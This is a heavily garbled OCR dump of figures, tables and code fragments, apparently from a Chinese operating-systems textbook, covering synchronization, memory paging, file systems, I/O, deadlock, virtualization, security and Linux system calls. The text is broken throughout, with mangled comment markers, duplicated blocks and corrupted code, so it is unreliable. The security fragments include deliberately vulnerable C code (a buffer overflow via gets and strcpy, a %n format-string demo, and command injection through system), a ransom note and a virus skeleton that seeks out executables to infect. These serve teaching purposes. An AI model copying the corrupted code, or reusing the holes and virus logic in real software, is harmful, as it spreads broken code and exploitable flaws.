/*检查右边的邻居现在可以吃吗*/ 1*离开临界区*/
void test(i) 1*i:哲学家编号，从0到N-1*/
if(state[i]==HUNGRY &&state[LEFT]!
=EATING &&state[RIGHT]!
=EATING){ state[i]=EATING;
up(&s[i]); }
} void test(i) 1*i:哲学家编号，从0到N-1*/
if(state[i]==HUNGRY &&state[LEFT]!
=EATING &&state[RIGHT]!
=EATING){ state[i]=EATING;
up(&s[i]); }
}
typedef int semaphore; /*运用你的想象*/
semaphore mutex=1; /*控制对rc的访问*/
semaphore db=1; /*控制对数据库的访问*/
int rc=0; /*正在读或者即将读的进程数目*/
void reader(void) {
while(TRUE){ /*无限循环*/
down(&mutex); 1*获得对rc的互斥访问权*/
/*现在又多了一个读者*/
/*如果这是第一个读者……*/
/*释放对rc的互斥访问*/
/*访问数据*/
1*获取对rc的互斥访问*/
1*现在减少了一个读者*/
/*如果这是最后一个读者……*/ /*释放对rc的互斥访问*/
/*非临界区*/
}
{
a)
b)
c)
d) 变成
变成 变成
变成
虚拟地址空间
60K~64K 56K~60K
52K～56K 48K～52K 44K～48K 40K~44K
36K～40K 32K~36K 28K～32K 24K~28K 20K~24K 16K～20K
12K~16K
8K～12K 4K～8K OK～4K X
X
X
X
7
X
5
X
X
X
3
4
0
6
1
2 } 虚拟页面
物理内存地址
28K~32K 24K～28K 20K~24K 16K~20K 12K~16K 8K~12K
4K～8K
人0K~4K
有效位 虚拟页面号 修改位 保护位 页框号
1 140 1 RW 31
1 20 0 R X 38
1 130 1 RW 29
1 129 1 RW 62
1 19 0 R X 50
1 21 0 R X 45
1 860 1 RW 14
1 861 1 RW 75
算 法 注 释
最优算法 不可实现，但可用作基准
NRU(最近未使用)算法 LRU的很粗糙的近似
FIFO(先进先出)算法 可能抛弃重要页面
第二次机会算法 比FIFO有较大的改善
时钟算法 现实的
LRU(最近最少使用)算法 很优秀，但很难实现
NFU(最不经常使用)算法 LRU的相对粗略的近似
老化算法 非常近似LRU的有效算法
工作集算法 实现起来开销很大
工作集时钟算法 好的有效算法
A0
A1
A2
A3
A4
A6
B0
B1
B2
B3
B4
B5
B6
C1
C2
C3
需要程序员了解正在使用这种技 术吗?
否 是
存在多少线性地址空间?
1 许多
整个地址空间可以超出物理存储器 的大小吗?
是 是
过程和数据可以被区分并分别被保 护吗?
否 是
其大小浮动的表可以很容易提供吗?
否 是
用户间过程的共享方便吗?
否 是
段4
(7K)
段3
(8K)
段2
(5K)
段1
(8K)
段0
(4K)
段4
(7K)
段3
(8K)
段2
(5K)
(3K)
段7
(5K)
段0
(4K)
段6描述符
段5描述符
段4描述符
段3描述符
段2描述符
段1描述符
段0描述符
页表的主存储器地址 段长度(以页 面为单位)
页面大小：
0=1024字
1=64字
0=段是分页的
1=段是不分页的 其他位 页面大小：
0=1024字
1=64字
0=段是分页的
1=段是不分页的 其他位 页面大小：
0=1024字
1=64字
0=段是分页的
1=段是不分页的 其他位 页面大小：
0=1024字
1=64字
0=段是分页的
1=段是不分页的 其他位
页号 页内偏移量
4 1 7 读/写 13 1
6 0 2 只 读 10 1
12 3 1 读/写 2 1
0
2 1 0 只执行 7 只执行 7 1
2 2 12 只执行 9 只执行 9 1
目录 页面 偏移量
页 时间戳 V R M
0 6 1 0 1
1 9 1 1 0
2 9 1 工 1
3 7 1 0 0
4 4 0 0 0
页面 载入时间 最近一次访问时间 R M
0 126 280 1 0
1 230 265 0 1
2 140 270 0 0
3 110 285 1 工
段0 段0 段1 段1
读/执行 读/执行 读/写 读/写
虚拟页号 页框号 虚拟页号 页框号
0 2 0 在磁盘
1 在磁盘 1 14
2 11 2 9
3 5 3 6
4 在磁盘 4 在磁盘
5 在磁盘 5 13
6 4 6 8
7 3 7 12
扩展名 含 义
bak 备份文件
C C源程序文件
gif 符合图形交换格式的图像文件
hlp 帮助文件
html wWW超文本标记语言文档
jpg 符合JPEG编码标准的静态图片
mp3 符合MP3音频编码格式的音乐文件
mpg 符合MPEG编码标准的电影
0 目标文件(编译器输出格式，尚未链接)
pdf pdf格式的文件
ps PostScript文件
tex 为TEX格式化程序准备的输入文件
txt 一般正文文件
zip 压缩文件
模块头
目标模块
模块头
目标模块
模块头
目标模块
模块名称
日期
所有者
保护
大小
属 性 含 义
保护 谁可以访问文件，以什么方式存取文件
口令 访问文件需要的口令
创建者 创建文件者的ID
所有者 当前所有者
只读标志 0表示读/写；1表示只读
隐藏标志 0表示正常；1表示不在列表中显示
系统标志 0表示普通文件；1表示系统文件
存档标志 0表示已经备份；1表示需要备份
ASCII/二进制标志 0表示ASCI码文件；1表示二进制文件
随机访问标志 0表示只允许顺序访问；1表示随机访问
临时标志 0表示正常；1表示进程退出时删除该文件
记录长度 一个记录中的字节数
键的位置 每个记录中键的偏移量
键的长度 键字段的字节数
创建时间 创建文件的日期和时间
最后一次存取时间 上一次访问文件的日期和时间
最后一次修改时间 上一次修改文件的日期和时间
当前大小 文件的字节数
最大长度 文件可能增长到的字节数
1 * 复 制 文 件 程 序 ， 有 基 本 的 错 误 检 查 和 错 误 报 告 * / 1 * 复 制 文 件 程 序 ， 有 基 本 的 错 误 检 查 和 错 误 报 告 * /
#include <sys/types.h> #include <fcntl.h>
#include <stdlib.h> #include <unistd.h>
int main(int argc,char *argv[);
#define BUF_SIZE 4096
#define OUTPUT_MODE 0700 1 * 包 括 必 要 的 头 文 件 * /
1 * A N S I 原 型 * /
/ * 使 用 一 个 4 0 9 6 字 节 大 小 的 缓 冲 区 * /
1 * 输 出 文 件 的 保 护 位 * /
int main(int argc,char*argv[)
int in_fd,out_fd,rd_count,wt_count;
char buffer[BUF_SIZE];
if(argc!
=3)exit(1); / * 如 果 a r g c 不 等 于 3 , 语 法 错 * /
1 * 打 开 输 入 文 件 并 创 建 输 出 文 件 * /
in_fd=open(argv[1],O_RDONLY); / * 打 开 源 文 件 * /
if (in_fd<0)exit(2); / * 如 巢 该 文 件 不 能 打 开 ， 退 出 * /
out_ fd=cr eat(argv[2], OUTPUT_ MODE);/*创建目标文件*/
if(out_fd<0)exit(3); / * 如 果 该 文 件 不 能 被 创 建 ， 退 出 * /
1 * 循 环 复 制 * /
while(TRUE){
rd_ count=read(in_ fd,buffer,BUF__SIZE);/*读 一块数据*/
if(rd_count<=0)break; 1 * 如 果 文 件 结 束 或 读 时 出 错 ， 退 出 循 环 * /
wt_count =write(out_fd,buffer,rd_count);1*写数据*/
if(wt_count<=0)exit(4); /*wt _ count<=0是 一 个错误*/ }
/ * 关 闭 文 件 * /
close(in_fd);
close(out_fd);
if(rd_count ==0)
exit(O);
else
exit(5); 1 * 有 读 取 错 发 生 * /
} int main(int argc,char*argv[)
int in_fd,out_fd,rd_count,wt_count;
char buffer[BUF_SIZE];
if(argc!
=3)exit(1); / * 如 果 a r g c 不 等 于 3 , 语 法 错 * /
1 * 打 开 输 入 文 件 并 创 建 输 出 文 件 * /
in_fd=open(argv[1],O_RDONLY); / * 打 开 源 文 件 * /
if (in_fd<0)exit(2); / * 如 巢 该 文 件 不 能 打 开 ， 退 出 * /
out_ fd=cr eat(argv[2], OUTPUT_ MODE);/*创建目标文件*/
if(out_fd<0)exit(3); / * 如 果 该 文 件 不 能 被 创 建 ， 退 出 * /
1 * 循 环 复 制 * /
while(TRUE){
rd_ count=read(in_ fd,buffer,BUF__SIZE);/*读 一块数据*/
if(rd_count<=0)break; 1 * 如 果 文 件 结 束 或 读 时 出 错 ， 退 出 循 环 * /
wt_count =write(out_fd,buffer,rd_count);1*写数据*/
if(wt_count<=0)exit(4); /*wt _ count<=0是 一 个错误*/ }
/ * 关 闭 文 件 * /
close(in_fd);
close(out_fd);
if(rd_count ==0)
exit(O);
else
exit(5); 1 * 有 读 取 错 发 生 * /
}
引导块 超级块 空闲空间管理 i节点 根目录 文件和目录
物理块
物理块 7
文件 块 1
6 3 2
文件B
文件 块
2
11 10 12
0
文件 块
3
14
文件1项长度 文件1项长度 文件1项长度 文件1项长度
文件1属性 文件1属性 文件1属性 文件1属性
p r 0 r
e C t
b u d 9
e t 区
文件2项长度 文件2项长度 文件2项长度 文件2项长度
文件2属性 文件2属性 文件2属性 文件2属性
p e r s
0 n n e
1 ☒
文件3项长度 文件3项长度 文件3项长度 文件3项长度
文件3属性 文件3属性 文件3属性 文件3属性
f o 0 凶
指向文件1的文件名 指向文件1的文件名 指向文件1的文件名 指向文件1的文件名
文件1属性 文件1属性 文件1属性 文件1属性
指向文件2的文件名 指向文件2的文件名 指向文件2的文件名 指向文件2的文件名
文件2属性 文件2属性 文件2属性 文件2属性
指向文件3的文件名 指向文件3的文件名 指向文件3的文件名 指向文件3的文件名
文件3属性 文件3属性 文件3属性 文件3属性
P r 0 j
e C t
b U d 9
e t 区 p
e r S 0
n n e 1
区 f 0 0
区
文件大小 VU 1984 VU 2005 Web
16 KB 92.53 78.92 86.79
32 KB 97.21 85.87 91.65
64 KB 99.18 90.84 94.80
128 KB 99.84 93.73 96.93
256 KB 99.96 96.12 98.48
512 KB 100.00 97.73 98.99
1 MB 100.00 98.87 99.62
2 MB 100.00 99.44 99.80
4 MB 100.00 99.71 99.87
8 MB 100.00 99.86 99.94
16 MB 100.00 99.94 99.97
32 MB 100.00 99.97 99.99
64 MB 100.00 99.99 99.99
128 MB 100.00 99.99 100.00
136
210
97
41
63
21
48
310
516
230
162
612
342
214
160
664
216
320
180
482
234
897
422
140
223
223
160
126
块大小 FAT-12 FAT-16 FAT-31
0.5KB 2MB
1KB 4MB
2KB 8MB 128MB
4KB 16MB 256MB 1TB
8KB 512MB 2TB
16KB 1024MB 2TB
32KB 2048MB 2TB
1
1 ..
4 bin
7 dev
14 lib
9 etc
6 usr
8 tmp
Mode
size times
132
6
1 ··
19 dick
30 erik
51 jim
26 ast
45 bal
Mode
size times
406
26 ·
6 ·
64 grants
92 books
60 mbox
81 minix
17 src
设 备 数 据 率
键盘 10B/秒
鼠标 100B/秒
56K调制解调器 7KB/秒
300dpi扫描仪 1MB/秒
数字便携式摄像机 3.5MB/秒
4倍速蓝光光盘 18MB/秒
802.11n无线网络 37.5MB/秒
USB 2.0 60MB/秒
FireWire 800 100MB/秒
千兆以太网 125MB/秒
SATA 3磁盘驱动器 600MB/秒
USB 3.0 625MB/秒
SCSI Ultra 5总线 640MB/秒
单通道PCle 3.0总线 985MB/秒
2总线 2.5GB/秒
SONET OC-768网络 5GB/秒
copy_from_user(buffer,p,count); for(i=0;i<count;i++){
while (*printer_status_reg!
=READY);7*循环直到就绪*/
*printer_data_register=p[i]; /*输出一个字符*/ {
return_to_user();
用户级I/O软件
与设备无关的操作系统软件
设备驱动程序
中断处理程序
硬件 硬件 硬件
参数 IBM 360KB软盘 WD 3000 HLFS硬盘
柱面数 40 36481
每柱面磁道数 2 255
每磁道扇区数 9 63(平均)
每磁盘扇区数 720 586072368
每扇区字节数 512 512
磁盘容量 360KB 300GB
寻道时间(相邻柱面) 6ms 0.7ms
寻道时间(平均情况) 77ms 4.2ms
旋转时间 200ms 6ms
传输1个扇区的时间 22ms 1.4μs
条带0 条带1 条带2 条带3 条带0 条带1 条带2 条带3
条带4 条带5 条带6 条带7 条带4 条带5 条带6 条带7 1级RAID
条带8 条带9 条带10 条带11 b) 条带8 条带9 条带10 条带11
条带0 条带1 条带2 条带3 P0-3
条带4 条带5 条带6 条带7 P4-7 4级RAID
条带8 条带9 条带10 e) 条带11 P8-11
条带0 条带1 条带2 条带3 P0-3
条带4 条带5 条带6 P4-7 条带7
条带8 条带9 P8-11 条带10 条带11 5级RAID
条带12 P12-15 条带13 条带14 条带15
P16-19 条带16 条带17
f) 条带18 条带19
条带0 条带1 条带2 P0-2 P0-2
条带3 条 带 4 P3-5 P'3-5 条带5 6级RAID
条带6 P6-8 P'6-8 条带7 条带8
P9-11 P9-11 条 带 9
g) 条 带 1 0 条带11
前导码 数据 ECC
字 符 POSIX名 注 释
CTRL-H ERASE 退格一个字符
CTRL-U KILL 擦除正在键入的整行
CTRL-V LNEXT 按字面意义解释下一个字符
CTRL-S STOP 停止输出
CTRL-Q START 开始输出
DEL INTR 中断进程(SIGINT)
CTRL-\ QUIT 强制核心转储(SIGQUIT)
CTRL-D EOF 文件结尾
CTRL-M CR 回车(不可修改的)
CTRL-J NL 换行(不可修改的)
转义序列 含 义
ESC[nA 向上移动n行
ESC[nB 向下移动n行
ESC [nC 向右移动n个间隔
ESC [nD 向左移动n个间隔
ESC[m;nH 将光标移动到(m,n)
ESC[sJ 从光标清除屏幕(0到结尾、1从开始、2两者)
ESC[sK 从光标清除行(0到结尾、1从开始、2两者)
ESC[nL 在光标处插入n行
ESC [nM 在光标处删除n行
ESC[nP 在光标处删除n个字符
ESC[n@ 在光标处插入n个字符
ESC[nm 允许再现n(0=常规、4=粗体、5=闪烁、7=反白)
ESC M 如果光标在顶行上则向后滚动屏幕
#include <X11/Xlib.h>
#include<X11/Xutilh> main(int argc,char *argv[)
win=XCreateSimpleWindow(disp,…); /*为新窗口分配内存*/
XSetStandardProperties(disp,...); /*向窗口管理器宣布窗口*/
gc=XCreateGC(disp,win,0,0); /*创建图形上下文*/
XSelectinput(disp,win,ButtonPressMask I KeyPressMask IExposureMask);
XMapRaised(disp,win); /*显示窗口；发送Expose事件*/ while(running){
XNextEvent(disp,&event); /*获得下一个事件*/
switch (event.type){
case Expose: … ; break; case ButtonPress…:.; break;
case Keypress: .….b;reak;/*处理键盘输入*/
1*释放图形上下文*/
1*回收窗口的内存空间*/ /*拆卸网络连接*/
#include <windows.h>
int WINAPI WinMain(HINSTANCE h,HINSTANCE,hprev,char*szCmd,int iCmdShow) #include <windows.h>
int WINAPI WinMain(HINSTANCE h,HINSTANCE,hprev,char*szCmd,int iCmdShow) #include <windows.h>
int WINAPI WinMain(HINSTANCE h,HINSTANCE,hprev,char*szCmd,int iCmdShow) #include <windows.h>
int WINAPI WinMain(HINSTANCE h,HINSTANCE,hprev,char*szCmd,int iCmdShow)
{
WNDCLASS
MSG msg; wndclass; /*本窗口的类对象*/
/*进入的消息存放在这里*/ /*本窗口的类对象*/
/*进入的消息存放在这里*/
HWND hwnd; / * 窗 口 对 象 的 句 柄 ( 指 针 ) * / HWND hwnd; / * 窗 口 对 象 的 句 柄 ( 指 针 ) * / HWND hwnd; / * 窗 口 对 象 的 句 柄 ( 指 针 ) * / HWND hwnd; / * 窗 口 对 象 的 句 柄 ( 指 针 ) * /
/*初始化wndclass*/
wndclass.pfnWndProc=WndProc;
wndclass. IpszClassName="Program /*初始化wndclass*/
wndclass.pfnWndProc=WndProc;
wndclass. IpszClassName="Program /*初始化wndclass*/
wndclass.pfnWndProc=WndProc;
wndclass. IpszClassName="Program /*指示调用哪个过程*/ name";/*标题条的文本*/
RegisterClass(&wndclass); hwnd=CreateWindow(…)
ShowWindow(hwnd,iCmdShow); UpdateWindow(hwnd); RegisterClass(&wndclass); hwnd=CreateWindow(…)
ShowWindow(hwnd,iCmdShow); UpdateWindow(hwnd); /*向Windows注册wndclass*/ /*为窗口分配存储*/
/*在屏幕上显示窗口*/ /*指示窗口绘制自身*/ /*向Windows注册wndclass*/ /*为窗口分配存储*/
/*在屏幕上显示窗口*/ /*指示窗口绘制自身*/
while(GetMessage(&msg,NULL,0,0)){/*从队列中获取消息*/ while(GetMessage(&msg,NULL,0,0)){/*从队列中获取消息*/ while(GetMessage(&msg,NULL,0,0)){/*从队列中获取消息*/ while(GetMessage(&msg,NULL,0,0)){/*从队列中获取消息*/
TranslateMessage(&msg);
DispatchMessage(&msg); }
return(msg.wParam); TranslateMessage(&msg);
DispatchMessage(&msg); }
return(msg.wParam); / * 转 换 消 息 * /
/*将msg发送给适当的过程*/ / * 转 换 消 息 * /
/*将msg发送给适当的过程*/
}
long CALLBACK WndProc(HWND hwnd,UINT message,UINT wParam,long IParam)
/*这里是声明*/
switch (message){
case WM_CREATE: … ; re tun . … ;/*创建窗口*/
case WM_PAINT: … ; return . ;/*重绘窗口的内容*/
case WM_DESTROY: … ; return … ;/*销毁窗口*/
}
return(DefWindowProc(hwnd,message,wParam,IParam));/*默认*/ }
long CALLBACK WndProc(HWND hwnd,UINT message,UINT wParam,long IParam)
/*这里是声明*/
switch (message){
case WM_CREATE: … ; re tun . … ;/*创建窗口*/
case WM_PAINT: … ; return . ;/*重绘窗口的内容*/
case WM_DESTROY: … ; return … ;/*销毁窗口*/
}
return(DefWindowProc(hwnd,message,wParam,IParam));/*默认*/ }
long CALLBACK WndProc(HWND hwnd,UINT message,UINT wParam,long IParam)
/*这里是声明*/
switch (message){
case WM_CREATE: … ; re tun . … ;/*创建窗口*/
case WM_PAINT: … ; return . ;/*重绘窗口的内容*/
case WM_DESTROY: … ; return … ;/*销毁窗口*/
}
return(DefWindowProc(hwnd,message,wParam,IParam));/*默认*/ }
long CALLBACK WndProc(HWND hwnd,UINT message,UINT wParam,long IParam)
/*这里是声明*/
switch (message){
case WM_CREATE: … ; re tun . … ;/*创建窗口*/
case WM_PAINT: … ; return . ;/*重绘窗口的内容*/
case WM_DESTROY: … ; return … ;/*销毁窗口*/
}
return(DefWindowProc(hwnd,message,wParam,IParam));/*默认*/
设备 Li等人(1994) Lorch和Smith(1998)
显示器 68% 39%
CPU 12% 18%
硬盘 20% 12%
调制解调器 6%
声卡 2%
内存 0.5% 1%
其他 22%
A 1 1 0 0
B 0 1 1 2
C 3 1 0 0.
D 0 0 1 0
E 2 1 1 0
条 件 处理方式
互斥 一切都使用假脱机技术
占有和等待 在开始就请求全部资源
不可抢占 抢占资源
环路等待 对资源按序编号
void process_A(void){
acquire_lock(&resource_1);
while (try_lock(&resource_2)==FAIL){ release_lock(&resource_1);
wait_fixed_time();
acquire_lock(&resource_1); }
use_both_resources();
release_lock(&resource_2);
release_lock(&resource_1); }
void process_A(void){
acquire_lock(&resource_2);
while (try_lock(&resource_1)==FAIL){ release_lock(&resource_2);
wait_fixed_time();
acquire_lock(&resource_2); }
use_both_resources();
release_lock(&resource_1);
release_lock(&resource_2); }
已分配资源 最大需求量 可用资源
进程A
进程B
进程C
进程D 10211
20110
11010
11110 11213
22210
21310
11221 00×11
0 1 1 1 2
0 1 0 1 0
0 0 0 0 1
2 1 0 0 0
虚拟化方式 第一类虚拟机管理程序 第二类虚拟机管理程序
无硬件支持 ESX Server 1.0 VMware Workstationl
半虚拟化 Xen 1.0
有硬件支持 vSphere,Xen,Hyper-V VMware Fusion.KVM,Parallels
进程虚拟化 Wine
虚拟硬件(前端) 后端
复用的 1个虚拟x86 CPU,使用与硬件CPU相同 的指令集扩展 由宿主操作系统调度，宿主既可以是单 处理器也可以是多处理器
复用的 512MB连续的DRAM 由宿主操作系统分配和管理(逐页)
模拟的 PCI总线 完全模拟的PCI总线
模拟的 4个IDE磁盘
7个Buslogic SCSI磁盘 虚拟磁盘(存储为文件)或直接访问给 定的裸设备
模拟的 1个IDE CD-ROM ISO镜像或模拟访问实际的CD-ROM
模拟的 2个1.44MB软盘驱动器 物理软盘或软盘镜像
模拟的 2个串行端口COM1和COM2 与宿主的串行端口或文件连接
模拟的 一个打印机(LPT) 可以与宿主的LPT端口连接
模拟的 1个键盘(104键) 完全模拟的，当VMware应用接收到键 码动作时生成键码事件
模拟的 1个PS-2鼠标 同键盘
模拟的 3个AMD Lance以太网卡 桥接模式或宿主模式
模拟的 1个声卡 完全模拟的
Module Address Opcode Value
节点 块 偏移量
A。
A₁ A₂ A₃ A₄ A₅
B₀ B, B₂ C₀ C. C₂
D。
D₁ D₂ D₃ D₄ E。
E, E₂ E₃ E₄ E₅ E₆
A。
A₁ A₂ A₃ A₄ A₅
B。
B₁ B₂ C。
C, C₂
D。
D. D₂ D₃ D₄ E。
E, E2 E₃ E₄ E₅ E₆
应用 应用
运行时 系统 运行时 系统
操作
系统 操作
系统
硬件 硬件
项目 多处理机 多计算机 分布式系统
节点配置 CPU CPU、RAM、网络接口 完整的计算机
节点外设 全部共享 共享exc.,可能除了磁盘 每个节点全套外设
位置 同一机箱 同一房间 可能全球
节点间通信 共享RAM 专用互连 传统网络
操作系统 一个，共享 多个，相同 可能都不相同
文件系统 一个，共享 一个，共享 每个节点自有
管理 一个机构 一个机构 多个机构
可靠消息流 书的页序列
可靠字节流 远程登录
不可靠连接 数字化语音
不可靠数据报 网络测试数据包
确认数据报 注册邮件
请求一应答 数据库查询
a b C
2.写 入“c”
⑧ a b
b) 1. 读 入 “ab”
a b
3. 读 取 “ab”
("abc",2,5)
("matrix-1",1,6,3.14)
("family","is-sister","Stephany","Roberta")
目标 威胁
数据机密性 数据暴露
数据完整性 数据篡改
读 读写
读 读写 执行 读写 读
读写 执行 读 读
读 读写 Enter
读 读写
执行 读写 写
读写
执行 写 写
文件 访问控制列表
Password tana,sysadm:RW
Pigeon_data bill,pigfan:RW;tana,pigfan:RW;…
读/执行
读/执行 读写
读/执行 读写
Bobbie,4238,e(Dog,4238)
Tony,2918,e(6%%TaeFF,2918)
Laura,6902,e(Shakespeare.6902)
Mark,1694,e(XaB#Bwcz,1694)
Deborah,1092,e(LordByron,1092)
01.void A(char*date){
02.int len;
03.char B[128];
04.char logMsg[256]; 05.
06. strcpy(logMsg,date); /*首先将日期字符串复制到日志信息中*/
07. len=strlen (date); /*统计日期字符串用了多少个字符*/
08. gets(B); /*现在得到实际信息*/
09. strcpy(logMsg+len,B); /*然后将实际信息复制到日志信息中日期之后的位置*/
10.writeLog(logMsg); 1*最终将日志信息写回硬盘*/ 11.}
int i=0;
printf("Hello %nwor Id\n",&i); 1*%n 存储到i中 1
printf("i=%d\n",i); /现在i 是6*/
int main(int argc,char*argv[) {
char src[100],dst[100],cmd[205]="cp"; printf("Please enter name of source file:"); gets(src);
strcat(cmd,src);
strcat(cmd,"");
printf("Please enter name of destination file:"); gets(dst);
strcat(cmd,dst);
system(cmd); } / * 声 明 3 个 字 符 串 * / / * 请 求 源 文 件 /
/ " 从 键 盘 得 到 输 入 *
/ 将 s r c 连 接 在 c p 后 面 * /
/ " 从 键 盘 得 到 输 入 * 1
/ 完 成 命 令 字 符 串 1
/ * 执 行 c p 命 令 *
GREETINGS FROM GENERAL ENCRYPTION!
TO PURCHASE A DECRYPTION KEY FOR YOUR HARD DISK,PLEASE SEND S100 IN
SMALL,UNMARKED BILLS TO BOX 2154,PANAMA CITY,PANAMA.THANK YOU.WE APPRECIATE YOUR BUSINESS.
#include<sys/types.h> /*标准的POSIX头文件*/
#include <sys/stat.h> #include <direnth>
#include <fcnti.h> #include <unistd.h>
struct stat sbuf; /*用于stat调用，看文件是否为sym连接*/ #include<sys/types.h> /*标准的POSIX头文件*/
#include <sys/stat.h> #include <direnth>
#include <fcnti.h> #include <unistd.h>
struct stat sbuf; /*用于stat调用，看文件是否为sym连接*/
search(char*dir_name) {
DIR *dirp;
struct dirent*dp;
dirp=opendir(dir_name);
if(dirp ==NULL)return;
while(TRUE){
dp=readdir(dirp); if (dp==NULL){ chdir(".");
break;
}
if(dp->d_name[0]=='.')continue; Istat(dp->d_name,&sbuf); /*可执行表的递归查找*/
/*指向打开目录流的指针*/ 1*指向目录项的指针*/
/*打开此目录*/
/*不能打开目录时返回*/
/*读下一个目录项*/
/*NULL表示已完成操作*/ /*回到父目录*/
/*跳出循环*/
/*跳过“.”和“..”目录*/ /*项是符号连接吗?
*/
if (S_ISLNK(sbuf.st_mode))continue;;/*跳过符号连接*/
if(chdir(dp->d_name)==0){ /*如果chdir成功，则必定是目录*/
search("."); /*如果是，进入目录查询*/
}else{ /*无(文件),则感染*/
if(access(dp->d_name,X_OK)==0)/*如是可执行文件就感染*/ infect(dp->d_name);
}
closedir(dirp); /*dir运行完毕，关闭程序并返回*/
} if (S_ISLNK(sbuf.st_mode))continue;;/*跳过符号连接*/
if(chdir(dp->d_name)==0){ /*如果chdir成功，则必定是目录*/
search("."); /*如果是，进入目录查询*/
}else{ /*无(文件),则感染*/
if(access(dp->d_name,X_OK)==0)/*如是可执行文件就感染*/ infect(dp->d_name);
}
closedir(dirp); /*dir运行完毕，关闭程序并返回*/
}
IP地址 端口 动作
207.68.160.190 80 Accept
207.68.160.191 25 Accept
207.68.160.192 21 Accept
* * Deny
URL 签署者 对象 动作
* lusr/tmp/* Read,Write
程 序 典型应用
cat 将多个文件连接到标准输出
chmod 修改文件保护模式
cp 复制一个或多个文件
cut 从一个文件中剪切一段文字
grep 在文件中检索给定模式
head 提取文件的前几行
Is 列出目录
make 编译文件生成二进制文件
mkdir 创建目录
od 以八进制显示一个文件
paste 将一段文字粘贴到一个文件中
pr 为打印格式化文件
ps 列出正在运行的进程
rm 删除一个或多个文件
rmdir 删除一个目录
sort 对文件中的所有行按照字母序进行排序
tail 提取文件的最后几行
tr 在字符集之间转换
pid=fork(); if(pid<0){
handle_error(); }else if(pid>0){
}else{
{ /*如果创建成功，则父进程pid>0*/
/*创建失败(比如内存或某些表溢出)*/ /*这里是父进程的代码*/
/*这里是子进程的代码*/
信 号 原 因
SIGABRT 进程中止且强迫核心转储
SIGALRM 定时器超时
SIGFPE 出现浮点错误(比如，除0)
SIGHUP 进程所使用的电话线被挂断
SIGILL 用户按了DEL键中断了进程
SIGQUIT 用户按键要求核心转储
SIGKILL 杀死进程(不能被捕捉或忽略)
SIGPIPE 进程写入了无读者的管道
SIGSEGV 进程引用了非法的内存地址
SIGTERM 用于要求进程正常终止
SIGUSR1 用于应用程序定义的目的
SIGUSR2 用于应用程序定义的目的
系统调用 描 述
pid=fork() 创建一个与父进程一样的子进程
pid=waitpid(pid,&statloc,opts) 等待子进程终止
s=execve (name,argv,envp) 替换进程的核心映像
exit(status) 终止进程运行并返回状态值
s=sigaction(sig,&act,&oldact) 定义信号处理的动作
s=sigreturn(&context) 从信号返回
s=sigprocmask (how,&set,&old) 检查或更换信号掩码
s=sigpending(set) 获得阻塞信号集合
s=sigsuspend(sigmask) 替换信号掩码或挂起进程
s=kill (pid,sig) 发送信号到进程
residual=alarm(seconds) 设置定时器
s=pause () 挂起调用程序直到下一个信号出现
while(TRUE){
type_prompt();
read_command(command,params);
pid=fork();
if (pid<0){ /*永远重复*/
1*在屏幕上显示提示符*/ /*从键盘读取输入行*/
/*创建子进程*/
printf("Unable to fork O");/*错误状态*/
} continue; /*重复循环*/
if(pid I=0){
waitpid(-1,&status,O); /*父进程等待子进程*/ }else{
execve(command,params,0); /*子进程执行操作*L {
{ printf("Unable to fork O");/*错误状态*/
} continue; /*重复循环*/
if(pid I=0){
waitpid(-1,&status,O); /*父进程等待子进程*/ }else{
execve(command,params,0); /*子进程执行操作*L {
{
标志 置位时的含义 清除时的含义
CLONE_VM 创建一个新线程 创建一个新进程
CLONE_FS 共享umask、根目录和工作目录 不共享
CLONE_FILES 共享文件描述符 复制文件描述符
CLONE_SIGHAND 共享信号句柄表 复制该表
CLONE_PID 新线程获得旧的PID 新线程获得自己的PID
CLONE_PARENT 新线程与调用者有相同的父亲 新线程的父亲是调用者
系统调用 描 述
s=brk(addr) 改变数据段大小
a=mmap(addr,len,prot,flags,fd,offset) 映射文件
s=unmap(addr,len) 取消映射文件
mem_map:页描述符数组
200□
150二
80二
70
ZONE_HIGHMEM
ZONE_NORMAL
ZONE_DMA
区域描述符
node_zones[3] node_mem_map
node_id Mapping=address_space
free_pages pages_low pages_high
free_area[0]
free_area[1]
.
函数调用 描 述
s=cfsetospeed(&termios,speed) 设置输出速率
s=cfsetispeed(&termios,speed) 设置输入速率
s=cfgetospeed(&termios,speed) 获取输出速率
s=cfgtetispeed(&termios,speed) 获取输入速率
s=tcsetattr(fd,opt,&termios) 设置属性
s=tcgetattr(fd,&termios) 获取属性
设备 Open Close Read Write loctl 其他
无效设备 null null null null null …
内存 null null mem_read mem_write null …
键盘 k_open k_close k_read error k_ioctl …
终端 tty_open tty_close tty_read tty_write tty_ioctl …
打印机 Ip_open lp_close error lp_write Ip_ioctl …
目录 内容
bin 二进制(可执行)文件
dev I/O设备文件
etc 各种系统文件
lib 库
usr 用户目录
0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15
0 1 2 3 4 5 6 8 9 10 11 12 13 14 15
系 统 调 用 描 述
fd=creat(name,mode) 创建新文件的一种方法
fd=open(file,how,…) 打开文件读、写或者读写
s=close(fd) 关闭一个已经打开的文件
n=read(fd,buffer,nbytes) 从文件中读取数据到一个缓冲区
n=write(fd,buffer,nbytes) 把数据从缓冲区写到文件
position=lseek(fd,offset,whence) 移动文件指针
s=stat(name,&buf) 获取一个文件的状态信息
s=fstat(fd,&buf) 获取一个文件的状态信息
s=pipe(&fd[0]) 创建一个管道
存储文件的设备
i节点号(哪个文件在设备上)
文件模式(包括保护信息)
指向文件的连接数
文件所有者的标识
文件所属的组
文件大小(单位是字节)
创建时间
最近访问的时间
最近修改的时间
系统调用 描 述
s=mkdir(path,mode) 建立新目录
s=rmdir(path) 删除目录
s=link(oldpath,newpath) 创建指向已有文件的链接
s=unlink(path) 取消文件的链接
s=chdir(path) 改变工作目录
dir=opendir(path) 打开目录
s=closedir(dir) 关闭目录
dirent=readdir(dir) 读取一个目录项
rewinddir(dir) 回转目录使其再次被读取
对象 描述 操作
Superblock 特定的文件系统 read_inode,sync_fs
Dentry 目录项，路径的一个组成部分 create,link
I-node 特定的文件 d_compare,d_delete
File 跟一个进程相关联的打开文件 read,write
引导 块 块组0 块组1 块组2 块组3 块组4
超级 块 组描 述符 块位 图 节点
位图 节点 数据块
域 字节数 描 述
Mode 2 文件类型、保护位、setuid和setgid位
Nlinks 2 指向该i节点的目录项的数目
Uid 2 文件属主的UID
Gid 2 文件属主的GID
Size 4 文件大小(以字节为单位)
Addr 60 12个磁盘块及其后面3个间接块的地址
Atime 4 最近访问文件的时间
Mtime 4 最近修改文件的时间
Ctime 4 最近改变节点的时间(除去其他时间)
二 进 制 标 记 准许的文件访问权限
